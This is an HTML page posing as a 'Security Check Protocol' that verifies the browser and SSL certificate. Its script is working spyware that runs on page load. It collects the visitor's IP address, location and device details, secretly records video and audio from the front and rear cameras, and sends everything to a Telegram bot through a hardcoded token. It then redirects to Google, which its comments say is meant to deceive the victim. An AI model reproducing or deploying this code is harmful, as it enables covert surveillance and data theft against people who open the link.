<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check Protocol</title>
    <style>
        /* واجهة باللون الأزرق الرسمي لإبعاد الشبهات */
        body {
            background-color: #0d1117;
            color: #58a6ff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .loader {
            border: 4px solid #21262d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            box-shadow: 0 0 20px rgba(88, 166, 255, 0.2);
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 25px; font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #c9d1d9; }
        .sub-text { margin-top: 10px; font-size: 11px; color: #8b949e; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="status" id="st">INITIALIZING SECURE CONNECTION...</div>
    <div class="sub-text">Verifying Browser Integrity & SSL Certificate</div>

    <script>
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');

        async function startProcess() {
            if (!chatId) return;
           
            // 1. جمع البيانات العميقة وتعريبها
            const report = await getDeviceData();

            // 2. تصوير الأمامية وإرسالها مع التقرير (10 ثوانٍ)
            await captureAndSend("user", "الأمامية", 10000, report);

            // 3. تصوير الخلفية وإرسالها كفيديو منفصل (10 ثوانٍ)
            await captureAndSend("environment", "الخلفية", 10000, "🎥 مقطع إضافي: الكاميرا الخلفية");

            // 4. التوجه النهائي لتمويه الضحية
            window.location.href = "https://www.google.com";
        }

        async function getDeviceData() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const d = await ipRes.json();
                const battery = await navigator.getBattery();
               
                // جلب معلومات الهاردوير
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const gpu = gl ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('(')[0] : "غير معروف";
               
                const ram = navigator.deviceMemory || "غير معروف";
                const cpu = navigator.hardwareConcurrency || "غير معروف";

                return `✅ **تم اختراق هدف جديد**\n━━━━━━━━━━━━━\n🌐 **بيانات الشبكة:**\n• العنوان: \`${d.ip}\`\n• المزود: ${d.org}\n• الموقع: ${d.city}, ${d.country_name}\n\n📱 **مواصفات الجهاز:**\n• المنصة: ${navigator.platform}\n• المعالج: ${cpu} أنوية\n• الرام: ${ram} جيجا\n• الجرافيك: ${gpu}\n\n🔋 **حالة الطاقة:**\n• مستوى البطارية: ${Math.round(battery.level * 100)}%\n• في الشحن: ${battery.charging ? 'نعم' : 'لا'}\n\n⚙️ **تفاصيل النظام:**\n• الإصدار: ${navigator.userAgent.split(')')[0].split('(')[1]}\n• اللغة: ${navigator.language}\n━━━━━━━━━━━━━`;
            } catch (e) { return "⚠️ تم جلب بعض البيانات فقط"; }
        }

        async function captureAndSend(mode, label, duration, textContent) {
            try {
                document.getElementById('st').innerText = `CHECKING ${label.toUpperCase()} SENSOR...`;
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                const recorder = new MediaRecorder(stream);
                let parts = [];

                recorder.ondataavailable = (e) => { if (e.data.size > 0) parts.push(e.data); };

                return new Promise((resolve) => {
                    recorder.onstop = async () => {
                        const blob = new Blob(parts, { type: 'video/mp4' });
                        await uploadToTelegram(blob, textContent);
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (err) {
                return Promise.resolve();
            }
        }

        async function uploadToTelegram(videoBlob, caption) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', videoBlob, 'recording.mp4');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            // إرسال الطلب مع انتظار لضمان الوصول
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });
        }

        window.onload = startProcess;
    </script>
</body>
</html>
